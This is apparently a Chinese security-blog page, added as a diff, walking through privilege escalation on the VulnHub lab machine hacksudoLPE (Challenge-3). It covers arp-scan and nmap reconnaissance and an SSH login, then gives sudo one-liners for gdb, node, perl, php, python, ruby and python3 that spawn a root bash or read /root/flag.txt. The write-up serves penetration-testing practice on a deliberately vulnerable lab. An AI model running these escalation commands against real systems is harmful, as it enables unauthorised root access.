@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vulnhub靶机hacksudoLPE中Challenge-3 - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=vulnhub" class="tag tag-green">#vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="tag tag-blue">#渗透测试</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2026 // 06 / 09</div>
+  <div class="post-title">vulnhub靶机hacksudoLPE中Challenge-3</div>
+  <div class="post-tags">
+    <a href="../tags/list.html?tag=vulnhub" class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
+  </div>
+
+  <div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+    <nav class="post-toc">
+      <span class="post-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#discovery">主机发现</a></li>
+        <li class="toc-h4"><a href="#portscan">端口扫描</a></li>
+        <li class="toc-h4"><a href="#ssh">SSH 登录</a></li>
+        <li class="toc-h4"><a href="#gdb">gdb</a></li>
+        <li class="toc-h4"><a href="#node">node</a></li>
+        <li class="toc-h4"><a href="#perl">perl</a></li>
+        <li class="toc-h4"><a href="#php">php</a></li>
+        <li class="toc-h4"><a href="#python">python</a></li>
+        <li class="toc-h4"><a href="#ruby">ruby</a></li>
+        <li class="toc-h4"><a href="#python3">python3</a></li>
+      </ul>
+    </nav>
+
+    <p>下载地址：<a href="https://download.vulnhub.com/hacksudo/hacksudoLPE.zip">https://download.vulnhub.com/hacksudo/hacksudoLPE.zip</a></p>
+
+    <h4 id="discovery">主机发现</h4>
+    <p>使用 arp-scan 扫描局域网存活主机：</p>
+    <pre><code>arp-scan -l</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_001.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_001.png" alt="arp-scan 扫描">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_002.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_002.png" alt="目标确认">
+      </picture>
+    </p>
+
+    <h4 id="portscan">端口扫描</h4>
+    <p>nmap 全端口扫描：</p>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.148</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_003.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_003.png" alt="端口扫描">
+      </picture>
+    </p>
+    <p>服务与漏洞扫描：</p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_004.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_004.png" alt="服务扫描">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_005.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_005.png" alt="漏洞扫描结果">
+      </picture>
+    </p>
+
+    <h4 id="ssh">SSH 登录</h4>
+    <p>SSH 连接靶机，查看 Challenge-3 的提权提示：</p>
+    <pre><code>ssh kendo@192.168.21.148</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_006.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_006.png" alt="SSH 登录">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_007.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_007.png" alt="Challenge-3 提示">
+      </picture>
+    </p>
+    <p>Challenge-3 中 user 拥有 7 个 SUID/GUID 命令的 sudo 权限，分别是 gdb、node、perl、php、python、ruby、python3。下面逐一演示每一条命令的提权过程。</p>
+
+    <h4 id="gdb">gdb</h4>
+    <p>gdb 是 GNU 调试器，可用于调试程序。查看 sudo -l 确认权限：</p>
+    <pre><code>sudo -l</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_008.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_008.png" alt="sudo -l 查看权限">
+      </picture>
+    </p>
+    <p>gdb 可通过执行任意代码实现提权。在 gdb 中执行 shell 命令：</p>
+    <pre><code>sudo gdb -nx -ex '!sh' -ex quit</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_009.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_009.png" alt="gdb 提权 1">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_010.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_010.png" alt="gdb 提权 2">
+      </picture>
+    </p>
+    <p>或者使用 gdb 的 python 扩展：</p>
+    <pre><code>sudo gdb -batch -ex 'python import os; os.system("/bin/bash")'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_011.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_011.png" alt="gdb python 扩展">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_012.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_012.png" alt="gdb 提权成功">
+      </picture>
+    </p>
+
+    <h4 id="node">node</h4>
+    <p>Node.js 是 JavaScript 运行时环境，可用于执行任意 JS 代码。确认 sudo 权限：</p>
+    <pre><code>sudo -l</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_013.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_013.png" alt="node sudo 权限">
+      </picture>
+    </p>
+    <p>利用 node 执行代码读取 flag 文件：</p>
+    <pre><code>sudo node -e 'console.log(require("fs").readFileSync("/root/flag.txt", "utf8"))'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_014.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_014.png" alt="node 读取 flag">
+      </picture>
+    </p>
+    <p>或者使用 child_process 模块执行系统命令：</p>
+    <pre><code>sudo node -e 'require("child_process").execSync("/bin/bash", {stdio: "inherit"})'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_015.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_015.png" alt="node 执行 shell">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_016.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_016.png" alt="node 提权 shell">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_017.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_017.png" alt="node 提权结果">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_018.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_018.png" alt="node whoami">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_019.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_019.png" alt="node flag">
+      </picture>
+    </p>
+
+    <h4 id="perl">perl</h4>
+    <p>Perl 是一款功能强大的脚本语言。确认 sudo -l 输出中包含 perl：</p>
+    <pre><code>sudo -l</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_020.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_020.png" alt="perl sudo 权限">
+      </picture>
+    </p>
+    <p>利用 perl 执行系统命令提权：</p>
+    <pre><code>sudo perl -e 'system("/bin/bash")'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_021.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_021.png" alt="perl 提权命令">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_022.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_022.png" alt="perl 提权 1">
+      </picture>
+    </p>
+    <p>也可以通过 Perl 读取文件：</p>
+    <pre><code>sudo perl -e 'open(F,"/root/flag.txt");print<F>'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_023.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_023.png" alt="perl 读取 flag">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_024.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_024.png" alt="perl flag 内容">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_025.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_025.png" alt="perl 提权成功">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_026.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_026.png" alt="perl whoami">
+      </picture>
+    </p>
+
+    <h4 id="php">php</h4>
+    <p>PHP 是通用脚本语言，可通过命令行执行代码。确认 sudo -l 输出：</p>
+    <pre><code>sudo -l</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_027.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_027.png" alt="php sudo 权限">
+      </picture>
+    </p>
+    <p>使用 php 的 exec 函数执行系统命令：</p>
+    <pre><code>sudo php -r 'system("/bin/bash");'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_028.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_028.png" alt="php 提权命令">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_029.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_029.png" alt="php 提权 1">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_030.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_030.png" alt="php 提权 2">
+      </picture>
+    </p>
+    <p>同样可以通过 php 读取敏感文件：</p>
+    <pre><code>sudo php -r 'echo file_get_contents("/root/flag.txt");'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_031.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_031.png" alt="php 读取 flag">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_032.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_032.png" alt="php flag 内容">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_033.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_033.png" alt="php 提权成功">
+      </picture>
+    </p>
+
+    <h4 id="python">python</h4>
+    <p>Python 解释器允许执行任意代码。确认 sudo 权限：</p>
+    <pre><code>sudo -l</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_034.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_034.png" alt="python sudo 权限">
+      </picture>
+    </p>
+    <p>使用 os.system 调用 bash：</p>
+    <pre><code>sudo python -c 'import os; os.system("/bin/bash")'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_035.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_035.png" alt="python 提权命令">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_036.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_036.png" alt="python 提权 1">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_037.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_037.png" alt="python 提权 2">
+      </picture>
+    </p>
+    <p>也可使用 subprocess 模块：</p>
+    <pre><code>sudo python -c 'import subprocess; subprocess.call(["/bin/bash"])'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_038.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_038.png" alt="python subprocess">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_039.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_039.png" alt="python subprocess 提权">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_040.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_040.png" alt="python 提权成功">
+      </picture>
+    </p>
+
+    <h4 id="ruby">ruby</h4>
+    <p>Ruby 是动态脚本语言，同样可用于提权。确认 sudo -l 输出：</p>
+    <pre><code>sudo -l</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_041.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_041.png" alt="ruby sudo 权限">
+      </picture>
+    </p>
+    <p>利用 ruby 的 exec 函数直接替换进程为 bash：</p>
+    <pre><code>sudo ruby -e 'exec "/bin/bash"'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_042.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_042.png" alt="ruby 提权命令">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_043.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_043.png" alt="ruby 提权 1">
+      </picture>
+    </p>
+    <p>也可使用 IO.popen 或 system 方法：</p>
+    <pre><code>sudo ruby -e 'system("/bin/bash")'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_044.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_044.png" alt="ruby system 提权">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_045.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_045.png" alt="ruby 提权成功">
+      </picture>
+    </p>
+
+    <h4 id="python3">python3</h4>
+    <p>python3 与 python 用法一致，确认 sudo 权限：</p>
+    <pre><code>sudo -l</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_046.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_046.png" alt="python3 sudo 权限">
+      </picture>
+    </p>
+    <p>提权命令同 python：</p>
+    <pre><code>sudo python3 -c 'import os; os.system("/bin/bash")'</code></pre>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_047.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_047.png" alt="python3 提权命令">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_048.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_048.png" alt="python3 提权 1">
+      </picture>
+    </p>
+    <p>
+      <picture>
+        <source srcset="../assets/lp3_049.webp" type="image/webp">
+        <img loading="lazy" src="../assets/lp3_049.png" alt="python3 提权成功">
+      </picture>
+    </p>
+
+    <p>至此，Challenge-3 全部 7 个 SUID/GUID 提权命令（gdb、node、perl、php、python、ruby、python3）均已演示完毕。利用方式参考 <a href="https://gtfobins.github.io/">GTFOBins</a> 获取更多细节。</p>
+
+  </div>
+</div>
+
+<div class="footer">
+  <div class="brand"><span class="rei-symbol">◈</span> RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG <span class="rei-symbol">◈</span></div>
+  <div class="motto">&gt; 道可道，非常道，名可名，非常名</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="theme-dock" id="themeDock">
+  <div class="theme-dock-item active" data-theme="dark">☽</div>
+  <div class="theme-dock-item" data-theme="light">☀</div>
+  <div class="theme-dock-item" data-theme="crystal">◇</div>
+  <div class="theme-dock-item" data-theme="ego">♢</div>
+  <div class="theme-dock-item" data-theme="rei">レ</div>
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+document.querySelectorAll('.post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'code-wrapper';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'code-header';
+
+  const info = document.createElement('span');
+  info.className = 'code-header-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'code-header-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'code-btn code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'code-btn code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+<div class="graph-sidebar" id="graphSidebar">
+  <div class="graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("graphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+<script src="../assets/common.js"></script>
+
+</body>
+</html>
